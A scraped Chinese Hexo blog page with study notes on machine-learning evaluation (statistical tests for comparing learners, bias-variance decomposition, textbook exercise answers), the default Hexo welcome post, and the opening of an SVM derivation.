<script type="math/tex; mode=display">\mu=\frac{1}{k}\sum_{i=1}^k\hat{\epsilon}_i</script><script type="math/tex; mode=display">\sigma^2 = \frac{1}{k-1}\sum_{i=1}^k(\hat{\epsilon}_i- \mu)</script><p>考虑到k个测试错误率可以看做繁华错误率$\epsilon_0$的独立采样，则t统计量为</p>
<script type="math/tex; mode=display">\tau_t=\frac{\sqrt{k}(\mu - \epsilon_0)}{\sigma}</script><p>服从自由度为k-1的t分布</p>
<p>得到的$\tau_t$如果小于查表得到的t值，则接受原假设，否则拒绝原假设</p>
<h3 id="2-4-2-交叉验证t检验"><a href="#2-4-2-交叉验证t检验" class="headerlink" title="2.4.2 交叉验证t检验"></a>2.4.2 交叉验证t检验</h3><p>对于两个学习器A和B，使用k折交叉验证法得到的测试错误率分别为$\epsilon_1^A,\epsilon_2^A,…,\epsilon_k^A$和$\epsilon_1^B,\epsilon_2^B,…,\epsilon_k^B$,其中$\epsilon_i^A$和$\epsilon_i^B$是相同的第i折训练/测试集上得到的结果，则可用k折交叉验证”成对t验证”(paired t-tests)来进行比较。这里的思想为如果两个学习器的性能相同，则它们使用相同的训练/测试集得到的测试错误率应相同，即$\epsilon_i^A=\epsilon_i^B$</p>
<p>对于k折交叉验证产生的k对测试错误率，先对每对的测试错误率求差，得到$\Delta_i=\epsilon_i^A-\epsilon_i^B$，若两个学习器性能相同，则差值均值应为0，因此对$\Delta_1,\Delta_2,…,\Delta_k$来对”学习器A和学习器B性能相同”的假设进行t验证,计算出$\Delta$的均值$\mu$和方差$\sigma^2$，在显著度$\alpha$下，若</p>
<script type="math/tex; mode=display">\tau_t=\left|\frac{\sqrt{k}\mu}{\sigma}\right|</script><p>小于临界值$t_{\alpha/2,k-1}$则假设不能被拒绝，认为两个学习器的性能没有显著差异；否则则认为两个学习器有显著差异，且平均错误率较小的学习器性能更好，其中$t_{\alpha/2,k-1}$为自由度为k-1的t分布上尾部累积分布为$\alpha/2$的临界值</p>
<p>进行有效的假设验证的一个重要的前提是测试错误率均为泛化错误率的独立 采样。但是通常情况下由于样本有限，在使用交叉验证等实验估计时，不同轮次的训练集都有不定程度的重叠，这使得测试错误率实际上并不独立，会导致过高估计假设成立的概率，为缓解这一问题，可采用”5$\times$2交叉验证”法。</p>
<p>就是做5次2折交叉验证，在每次2折交叉验证之前水机将数据打乱，使得5次交叉验证中的数据划分不重复。对于学习器A和B，第i次2折交叉验证将产生两对测试错误率，对他们分别求差，得到1折的差值$\Delta_i^1$和2折的差值$\Delta_i^2$，为了缓解测试错误率的非独立性，我们仅计算第1次2折交叉验证的两个结果的平均值，$\mu=0.5(\Delta_1^1+\Delta_1^2)$,但对每次2折实验的结果都计算其方差$\sigma_i^2=(\Delta_i^1-\frac{\Delta_i^1+\Delta_i^2}{2})^2+ (\Delta_i^2-\frac{\Delta_i^1+\Delta_i^2}{2})^2$,变量</p>
<script type="math/tex; mode=display">\tau_t=\frac{\mu}{\sqrt{0.2 \sum\limits_{i=1}^5 \sigma^2}}</script><p>服从自由度为5的t分布，其双边检验的临界值$t_{\alpha/2.5}$当，$\alpha=0.05$时，为2.5706，$\alpha=0.1$时，为2.0150</p>
<h3 id="2-4-3-McNemar检验"><a href="#2-4-3-McNemar检验" class="headerlink" title="2.4.3 McNemar检验"></a>2.4.3 McNemar检验</h3><p>对于二类问题，使用留出法不仅可估计出学习器A和B的测试错误率，还能获得两个学习器分类结果的差别</p>
<p>表: 两学习器分类差别列联表</p>
<table border="0" cellpadding="0" cellspacing="0" width="300" style="border-collapse:
 collapse;table-layout:fixed;width:225pt">
 <col width="100" span="3" style="width:75pt">
 <tr height="25" style="height:19.0pt">
  <td rowspan="2" height="50" width="100" style="height:38.0pt;width:75pt">算法B</td>
  <td colspan="2" class="xl63" width="200" style="width:150pt">算法A</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">正确</td>
  <td>错误</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">正确</td>
  <td>$e_{00}$</td>
  <td>$e_{01}$</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">错误</td>
  <td>$e_{10}$</td>
  <td>$e_{11}$</td>
 </tr>
 <tr height="0" style="display:none">
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
 </tr>
</table>

<p>假设两个学习器性能相同，则应有$e_{01}=e_{10}$，那么$\left|e_{01}-e_{10}\right|$应当服从正态分布，McNemar检验考察变量</p>
<script type="math/tex; mode=display">\tau_{\mathcal{X}^2}=\frac{(\left|e_{01}-e_{10}\right|-1)^2}{e_{01}+e_{10}}</script><p><strong>因为$e_{01}+e_{10}非常小，需要考虑连续性校正，所以分子中有-1$</strong></p>
<p>服从自由度为1的$\mathcal{X}^2$分布，即标准正态分布变量的平方，盖顶显著度$\alpha$，当以上变量值小于临界值$\mathcal{X}^2$时，不能拒绝假设，认为两个学习器性能没有显著区别，否则拒绝原假设，认为两个学习器有限制差别，并且平均错误率小的那个学习器性能更好。</p>
<h3 id="2-4-4-Friedman检验与Nemenyi后续检验"><a href="#2-4-4-Friedman检验与Nemenyi后续检验" class="headerlink" title="2.4.4 Friedman检验与Nemenyi后续检验"></a>2.4.4 Friedman检验与Nemenyi后续检验</h3><p>交叉验证T检验和McNemar检验都是在一个数据集上比较两个算法的的性能，但是很多情况下会在一组数据集上对多个算法进行比较，当有多个算法参与比较时，种方法是在每个数据集上分别列出两两比较的结果，而在亮亮比较上可以用前面的方法；另一种方法更为直接，使用基于算法排序的Friedman检验</p>
<p>假设用$D_1,D_2,D_3,D_4$四个数据集对算法A、B、C进行比较，首先使用留出法或交叉验证法得到每个算法在每个数据集上的测试结果，然后在每个数据集上根据测试性能由好到坏排序，并赋值1,2,…;若算法的测试性能相同，则平分序值。列如得到如下的算法比较序值表</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>数据集</th>
<th>算法A</th>
<th>算法B</th>
<th>算法C</th>
</tr>
</thead>
<tbody>
<tr>
<td>$D_1$</td>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>$D_2$</td>
<td>1</td>
<td>2.5</td>
<td>2.5</td>
</tr>
<tr>
<td>$D_3$</td>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>$D_4$</td>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>平均序值</td>
<td>1</td>
<td>2.125</td>
<td>2.875</td>
</tr>
</tbody>
</table>
</div>
<p>然后，使用Friedman检验来判断这些算法是否性能相同，若相同，则他们的平均序值应当相同，假设我们在N个数据集上比较k个算法，令$\mathcal{r}_i$表示第i个算法的平均序值，为了简化讨论，暂不考虑评分序值的情况，则$\mathcal{r}_i$的均值和方差分别为(k+1)/2和$(k^2-1)/12$.变量</p>
<script type="math/tex; mode=display">\tau_{\mathcal{X}^2}=\frac{k-1}{k}\cdot\frac{12N}{k^2-1}\sum_{i=1}^k(\mathcal{r}_i-\frac{k+1}{2})^2  \\
=\frac{12N}{k(k+1)}(\sum_{i=1}^k\mathcal{r}_i^2-\frac{k(k+1)^2}{4})</script><p>在k和N都较大时，服从自由度为k-1的$\mathcal{X}^2$分布</p>
<p>然而上述的”原始Friedman检验”过于保守，因为原始检验需要k较大(例如k&gt;30),现在通常使用变量</p>
<script type="math/tex; mode=display">\tau_F=\frac{(N-1)\tau_{\mathcal{X}^2}}{N(k-1)-\tau_{\mathcal{X}^2}}</script><p>$\tau_F$服从自由度为k-1和(k-1)(N-1)的F分布</p>
<p>若”所有算法的性能相同”这个假设被拒绝，则说明算法的性能显著不同，这是需要进行”后续检验”(post-hoc test)来进一步区分各算法，常用的有Nemenyi后续检验</p>
<p>Nemenyi检验计算出平均序值差别的临界值域</p>
<script type="math/tex; mode=display">CD=q\alpha\sqrt{\frac{k(k+1)}{6N}}</script><p>其中qa为Tukey分布的临界值，可以通过算法个数k和$\alpha$这两个参数查表得到，若两个算法的平均序值之差超过了临界值域CD，则以相同的置信度拒绝”两个算法性能相同”这一假设</p>
<p>根据这一系列内容，可以得到上述例子的关系</p>
<p>求出$\tau_F$的值为24.429，查F检验的表，得到$\alpha=0.05$临界值为5.143，因为大于临界值，所以拒绝原假设，然后使用”后续检验”，根据$\alpha=0.05$和k=3得到CD值为1.657，根据平均序值的差，可以得到A与B、B与C这两对算法没有显著区别，但是A与C是有显著区别的</p>
<h2 id="2-5偏差和方差"><a href="#2-5偏差和方差" class="headerlink" title="2.5偏差和方差"></a>2.5偏差和方差</h2><p>除了估计其泛化性能之外，还需要了解具有这样的泛化性能的本质，所以”偏差-方差分解”(bias-variance decomposition)是解释学习算法泛化性能的一种重要工具</p>
<p>偏差-方差分解试图对学习算法的期望泛化错误率进行拆解。对于测试样本x,令$y_D$为数据集中的标记，y为x的真实标记(因为有噪声，所以有可能$y_D\neq y$)$f(x;D)$为训练集D上学的模型f在x上的预测输出，以回归任务为例，</p>
<p>学习算法的期望预测为</p>
<script type="math/tex; mode=display">\bar{f}(x)=\mathbb{E}_D\left[f(x;D)\right] \qquad \mathbb{E}_D为在数据集D下的期望值</script><p>使用样本数相同的不同训练集产生的方差为</p>
<script type="math/tex; mode=display">var(x)=\mathbb{E}_D\left[(f(x;D)-\bar{f}(x))^2\right]</script><p>噪声为</p>
<script type="math/tex; mode=display">\epsilon^2=\mathbb{E}_D\left[(y_D-y)^2\right]</script><p>期望输出与实际标记的差别称为偏差(bias)，即</p>
<script type="math/tex; mode=display">bias^2(x)=(\bar{f}(x)-y)^2</script><p>为了方便讨论，假定噪声期望为0，即$\epsilon^2=\mathbb{E}_D\left[(y_D-y)^2\right]=0$，通过简单的多项式展开合并，可以对算法的期望泛化误差进行分解</p>
<script type="math/tex; mode=display">E(f;D)=\mathbb{E}_D\left[(f(x;D)-y_D)^2\right] \\
=bias^2(x)+ var(x)+ \epsilon^2</script><p>也就是说泛化误差可分解为偏差、方差和噪声之和</p>
<p>偏差度量了学习算法预测与真实结果的偏离程度，刻画了学习算法本身的拟合能力；方差度量了同样大小的训练集的变动所导致的学习性能的变化，即刻画了数据扰动所造成的影响；噪声则表达了在当前任务上任何学习算法能达到的期望泛化误差的下限，即刻画了学习问题本身的难度。</p>
<p>偏差-方差分解说明了泛化性能是由学习算法的能力、数据的充分性及学习任务本身的难度所共同决定的。为了获得好的泛化性能，则需要使偏差较小，即能够充分拟合数据，并且使得方差较小，即使得数据扰动影响小</p>
<p>一般而言，偏差和方差是有冲突的，称之为偏差-方差窘境(bias-variance dilemma)</p>
<p>一个训练模型主要有三个阶段，当训练不足时，因为学习器的拟合能力不强，所以训练数据的扰动不足以影响学习器，所以偏差主导泛化错误率，当训练的加深，学习器的拟合能力加强，训练数据的扰动渐渐被学习器所获取，方差主导泛化错误率，但随之逐步加深，学习器的拟合能力过强，导致一些数据局部性的特性被学习器学习到，导致发生过拟合，即把数据独有的特性当成了共同的特性。</p>
<h1 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h1><ol>
<li>数据集包含1000个样本，其中正例和反例都是500个，用留出法获取70%的训练数据和30%的测试数据，共有多少种划分方式？</li>
</ol>
<p>留出法就是等比获取，也就是说在正例和反例都随机获取150个作为测试数据，不管训练数据，因为测试数据定好了，训练数据就是唯一得了。所以是$C_{150}^{500} C_{150}^{500}=\dbinom{500}{150}^2$个方式</p>
<ol>
<li>训练集包含100个样本，其中正反例各一半，假定学习算法所产生的模型是将新样本预测为训练样本较多的类别(训练样本数相同时进行随机猜测)，试给出10折交叉验证法和留一法分别对错误率进行估计所得的结果</li>
</ol>
<p>k折交叉验证，因为分出的数据是尽量保持和原本数据集的分布一致性，所以都是正反例各一半，所以错误率是50%，</p>
<p>留一法，因为是选择一个数据样本当做测试集，所以根据训练样本反而因为测试集的那个样本的缺失，导致学习算法预测的是与测试集相反的结果，所以错误率是100%</p>
<ol>
<li>若学习器A的F1值比学习器B高，则A的BEP是否也比B高？</li>
</ol>
<p>BEP是把训练得到的正例可能性将真实数据从高到低进行排序，在根据各个阀值进行阶段，得到的曲线中找到P和R一样的点。</p>
<p>F1则是根据混淆矩阵来的到P和R进行计算得到的。</p>
<p>根据<a href="https://blog.csdn.net/icefire_tyh/article/details/52065867" target="_blank" rel="noopener">https://blog.csdn.net/icefire_tyh/article/details/52065867</a> 提供的例子可以看出BEP和F1并不想对等</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>真实数据排序</th>
<th style="text-align:center">1/+</th>
<th style="text-align:right">2/+</th>
<th style="text-align:right">3/+</th>
<th style="text-align:right">4/+</th>
<th style="text-align:right">5/+</th>
<th style="text-align:right">6/-</th>
<th style="text-align:right">7/-</th>
<th style="text-align:right">8/-</th>
<th style="text-align:right">9/-</th>
<th style="text-align:right">10/-</th>
</tr>
</thead>
<tbody>
<tr>
<td>学习器A的排序</td>
<td style="text-align:center">1/+</td>
<td style="text-align:right">2/+</td>
<td style="text-align:right">3/+</td>
<td style="text-align:right">4/+</td>
<td style="text-align:right">6/-</td>
<td style="text-align:right">5/-</td>
<td style="text-align:right">7/-</td>
<td style="text-align:right">8/-</td>
<td style="text-align:right">9/-</td>
<td style="text-align:right">10/-</td>
</tr>
<tr>
<td>学习器B的排序</td>
<td style="text-align:center">1/+</td>
<td style="text-align:right">2/+</td>
<td style="text-align:right">3/+</td>
<td style="text-align:right">4/+</td>
<td style="text-align:right">6/+</td>
<td style="text-align:right">5/-</td>
<td style="text-align:right">7/-</td>
<td style="text-align:right">8/-</td>
<td style="text-align:right">9/-</td>
<td style="text-align:right">10/-</td>
</tr>
</tbody>
</table>
</div>
<p>可以看出因为根据学习器A和学习器B的排序，将真实数据从高到低进行排序，得到的顺序是一致的，所以BEP一致，但是按照F1计算，则可以得到</p>
<p>学习器A和B的混淆矩阵</p>
<table border="0" cellpadding="0" cellspacing="0" width="400" style="border-collapse:
 collapse;table-layout:fixed;width:300pt">
 <col width="100" span="4" style="width:75pt">
 <tr height="25" style="height:19.0pt">
  <td height="25" width="100" style="height:19.0pt;width:75pt">学习器A</td>
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt">学习器B</td>
  <td width="100" style="width:75pt"></td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" align="right" style="height:19.0pt">4</td>
  <td align="right">1</td>
  <td align="right">4</td>
  <td align="right">1</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" align="right" style="height:19.0pt">0</td>
  <td align="right">5</td>
  <td align="right">1</td>
  <td align="right">4</td>
 </tr>
 <tr height="0" style="display:none">
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
 </tr>
</table>

<p>学习器A和B的P、R、F1值</p>
<table border="0" cellpadding="0" cellspacing="0" width="300" style="border-collapse:
 collapse;table-layout:fixed;width:225pt">
 <col width="100" span="3" style="width:75pt">
 <tr height="25" style="height:19.0pt">
  <td height="25" width="100" style="height:19.0pt;width:75pt"></td>
  <td width="100" style="width:75pt">学习器A</td>
  <td width="100" style="width:75pt">学习器B</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">P</td>
  <td align="right">1</td>
  <td align="right">0.8</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">R</td>
  <td align="right">0.8</td>
  <td align="right">0.8</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">F1</td>
  <td align="right">0.88888889</td>
  <td align="right">0.8</td>
 </tr>
 <tr height="0" style="display:none">
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
 </tr>
</table>


<ol>
<li>试述正例率(TPR)，假正例率(FPR)，和查准率(P)、查全率(R)之间联系</li>
</ol>
<p>TPR和R是一样的，都是预测的正确正例在所有真实正例的比例。</p>
<p>FPR是预测是正例但是实际是反例在所有真实反例的比例。P是预测正确的正例在所有预测为正例的比例，并没有实际关系</p>
<ol>
<li>试证明$AUC = 1 - \ell_{rank}$</li>
</ol>
<p>首先解析AUC公式，AUC公式是根据求线下的面积得到的。</p>
<p>根据南瓜书(<a href="https://datawhalechina.github.io/pumpkin-book/#/chapter2/chapter2" target="_blank" rel="noopener">https://datawhalechina.github.io/pumpkin-book/#/chapter2/chapter2</a> )得知，书上的图为一个特例，即根据预测度进行排序后，根据每一个样本点是正例或者反例从而垂直或者水平前进；如果两个点都在阀值上，并且是一个正例和反例时，那则直线应该是斜方向前进的。不过无论是那种情况，都可以使用 $(上底+下底)<em>高</em> \cfrac{1}{2}$来获取阀值间隔内的面积。</p>
<p>$\ell_{rank}=\frac{1}{m^+m^-}\sum_{x^+\in D^+}\sum_{x^-\in D^-}(I(f(x^+)&lt;f(x^-))+ \frac{1}{2}I(f(x^+)=f(x^-)))$</p>
<p>根据南瓜书提供的图例，可以得到3个情况</p>
<p>绿线为垂直向上，表示1个正例被正确判断，在y轴上的投影为”$\frac{1}{m^+}$”</p>
<p>红线为水平向右，表示一个反例被错误判断成了正例，在x上的投影为”$\frac{1}{m^-}$”</p>
<p>蓝线为朝着右上方向的斜线，表示有a个正例和b个反例被判断成了正例，则在x轴的投影为”$b\frac{1}{m^-}$”,在y轴上的投影为”$a\frac{1}{m^+}$”</p>
<p>其中图像的每条折线的预测值相同，并且从0点开始逐渐较小。</p>
<p>将公式拆分开来，<br>$\sum_{x^+ \in D^+}$可以看做对所有正例的一个遍历，分解成</p>
<p>for $x_i^+ \;in \;D^+: \\<br>\qquad \frac{1}{m^+m^-}\sum_{x^-\in D^-}(I(f(x^+)&lt;f(x^-))+ \frac{1}{2}I(f(x^+)=f(x^-)))\qquad 记为公式S$</p>
<p>其中$x_i^+$对应着每条绿线或者蓝线线段，遍历$x_i^+$可以看做遍历所有绿线和蓝线，S求出对应的绿线或蓝线和y轴组成的面积。</p>
<p>详细内容，先看绿线<br>对于每条绿线线段，因为是单一的绿线，所以没有预测点既有正例和反例的情况，所以去除后半段，只看反例的预测点大于正例的预测点的情况。<br>所以S简化为</p>
<script type="math/tex; mode=display">\frac{1}{m^+}\frac{1}{m^-}\sum_{x^-\in D^-}I(f(x_i^+)<f(x^-))</script><p>其中每一个空格的长度为$\frac{1}{m^-}$高度为$\frac{1}{m^+}$,$\sum_{x^-\in D^-}I(f(x_i^+)&lt;f(x^-))$为预测点大于正例的反例的个数，对应的就是空格的数量，乘以高和长，得到绿线左面的面积。</p>
<p>对于蓝线，公式S展开为</p>
<script type="math/tex; mode=display">\frac{1}{m^+}\frac{1}{m^-}\sum_{x^-\in D^-}I(f(x_i^+)<f(x^-)) \;+\; \frac{1}{m^+}\frac{1}{m^-}\sum_{x^-\in D^-}\frac{1}{2}I(f(x_i^+) \ne f(x^-))</script><p>有两个部分，其中前面的一部分就是蓝线左边的空格的面积，而右边的为自身的格子的左边的面积的，即为自身格子的左边的三角形面积。</p>
<p>因为总面积为1，所以可以得到$AUC = 1 - \ell_{rank}$</p>
<ol>
<li>试述错误率和ROC曲线的关系</li>
</ol>
<p>错误率为$\frac{FP+FN}{FP+FN+TP+TN}$</p>
<p>ROC有两个值为TPR和FPR，分别为$\frac{TP}{TP+FN}$，$\frac{FP}{FP+TN}$<br>每个点对应着一对TPR和FPR。</p>
<script type="math/tex; mode=display">错误率= \frac{(FP+TN)\times FPR+(TP+FN)\times (1-TPR)}{TP+FN+TN+FP}</script><p>因为$m^+ = TP+FN,\;m^-=TN+FP$,所以用来代替，得到</p>
<script type="math/tex; mode=display">错误率=\frac{m^-\times FPR +m^+\times (1-TPR)}{m^++m^-}</script><p>所以每个点可以用错误率来代替。错误率最小的点为FPR为0，TPR为1的时候</p>
<p>代价敏感的错误率为$\frac{cost_{01}\times FN + cost_{10}\times FP}{m}$<br>所以代价敏感的错误率为</p>
<script type="math/tex; mode=display">代价敏感错误率=\frac{m^-\times FPR\times cost_{10} +m^+\times (1-TPR)\times cost_{01}}{m^++m^-}</script><ol>
<li>证明任意一条ROC曲线都有一条对应代价曲线与之对应，反之亦然</li>
</ol>
<p>以后补充</p>
<ol>
<li>Min—max规范化和z-score规范化两种常见的规范化方式。这两者有何优缺点。<br>令x为规范化前的取值，x’为规范化后的取值，其中$x_{min},x_{max}$为规范化前的最小值和最大值，$x_{min}’,x_{max}’$为规范化后的最小和最大取值，$\bar{x},\sigma_x$为规范化前的均值和标准差,则:</li>
</ol>
<p>Min-max的规范化公式为</p>
<script type="math/tex; mode=display">x'= x_{min}' + \frac{x-x_{min}}{x_{max}- x_{min}}\times {x_{max}'-x_{min}'}</script><p>z-score的规范化公式为</p>
<script type="math/tex; mode=display">x'=\frac{x- \bar{x}}{\sigma_x}</script><p>Min-max规范化的优势是，每次新的数据如果在$x_{min}$ $x_{max}$的范围内，则不需要重新计算其他值，并且得到规范化的值都是大于0的;但是如果有极小(大)值，会有影响</p>
<p>z-score的优势是，极值对于规范化的影响不大，但是每次有新值时，都需要重新计算$\bar{x}$ $\sigma_x$</p>
<ol>
<li>试述$\mathcal{X}^2$检验过程</li>
</ol>
<p>适用于定类和定类的检验。</p>
<p>以后补充</p>
<ol>
<li>试述Friedman检验中使用的两个方程区别</li>
</ol>
<p>即<script type="math/tex">\tau_{\mathcal{X}^2}=\frac{12N}{k(k+1)}(\sum\limits_{i=1}^k\mathcal{r}_i^2-\frac{k(k+1)^2}{4})</script></p>
<p>和<script type="math/tex">\tau_F=\frac{(N-1)\tau_{\mathcal{X}^2}}{N(k-1)-\tau_{\mathcal{X}^2}}</script>的区别</p>
<p>只知道$\tau_{\mathcal{X}^2}$需要满足k较大(k&gt;30)的情况下，在k较小的情况下，会倾向于认为无显著区别。但是$\tau_F$并没有这个影响</p>
<p>详细的以后补充</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yueyec.github.io/2019/04/10/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yueyec">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yueyec's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/10/hello-world/" itemprop="url">Hello World</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-10T21:26:15+08:00">
                2019-04-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yueyec.github.io/2019/03/17/svm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yueyec">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yueyec's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/17/svm/" itemprop="url">svm</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-17T21:02:45+08:00">
                2019-03-17
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Data-Science/" itemprop="url" rel="index">
                    <span itemprop="name">Data Science</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="支持向量机"><a href="#支持向量机" class="headerlink" title="支持向量机"></a>支持向量机</h1><p>分隔超平面为$w^Tx + b$<br>常数b类似于回归里的$w_0$</p>
<p>因为w为超平面的法向量，其中设距离为$\gamma$,$x_i 到x_0$的距离为$\gamma$,其中$x_0$为在平面的点，x为要求距离的点，</p>
<p>x的向量为$x_0 + \gamma \frac{w}{||w||}$ ,其中$\frac{w}{||w||}$为向量w的的单位向量，又有$w^Tx_0 + b = 0$与$w^Tw = ||w||^2$</p>
<p>$x-x_0 = \gamma \frac{\vec{w}}{||w||}$ 两边乘以$w^T$得</p>
<p>$w^T(x-x_0)= \gamma \frac{w^Tw}{||w||}$</p>
<p>$w^T(x-x_0)= \gamma \frac{||w||^2}{||w||}$</p>
<p>$w^Tx + b=\gamma||w||$</p>
<p>所以计算点A到平面的距离:值为$\frac{|w^TA + b| }{||w||}$</p>
<p>当$y_i$为1,-1时，$\gamma = \frac{2}{||w||}$ $s.t. w^Tx+b &gt;= 1$</p>
<p>所以求$\gamma$的最大值，就是求$\frac{1}{2}||w||^2$ $s.t. w^Tx+b &gt;= 1$的最小值</p>
<p>用拉格朗日乘子法来把约束条件加到求解方程里</p>
<p>$L(w,\alpha,b)=\frac{1}{2}||w||^2 + \sum\limits_{i=1}^m\alpha^i(1-y_i(w^Tx_i+b)$</p>
<p>令$\theta(w)=\mathop{max}\limits_{a_{i} &gt;=0}L(w.\alpha,b)$</p>
<p>$\mathop{min}\limits_{w,b}\theta(w)=\mathop{min}\limits_{w,b}\mathop{max}\limits_{a_i &gt;=0}L(w,\alpha,b)=p^*$</p>
<p>用对偶性，最大和最小互换，但是有kkt条件需要满足,才能保证$p^<em>=d^</em>$</p>
<p>$\mathop{max}\limits_{\alpha_i&gt;=0}\mathop{mim}\limits_{w,b}L(w,\alpha,b)=d^*$</p>
<p>kkt条件为</p>
<p>min(f(x)),</p>
<p>$s.t. \\h_j(x)=0,j=1,2,..,p \\<br>g_k(x) &lt;=0,k=1,2,…,q \\<br>x\in X\subset R^n<br>$</p>
<p>需要满足</p>
<ol>
<li>$L(w,\alpha,b)$对x求导为0</li>
<li>$h_i(x)=0$</li>
<li>$\alpha * g_k(x) =0$</li>
</ol>
<p>对w,或b求导得到<br>$\frac{\partial L}{\partial w}=0 得到 w= \sum\limits_{i=1}^n\alpha_iy_ix_i$</p>
<p>$\frac{\partial L}{\partial b} =0 得到 \sum\limits_{i=1}^n\alpha_iy_i=0$</p>
<p>把w带回L中得到，一个只有$\alpha$的方程,??为什么是减去</p>
<p>$\mathop{max}\limits_{\alpha}\sum\limits_{i=1}^n\alpha_i - \frac{1}{2}\sum\limits_{i,j=1}^{n}\alpha_i\alpha_jy_iy_jx_i^Tx_j$</p>
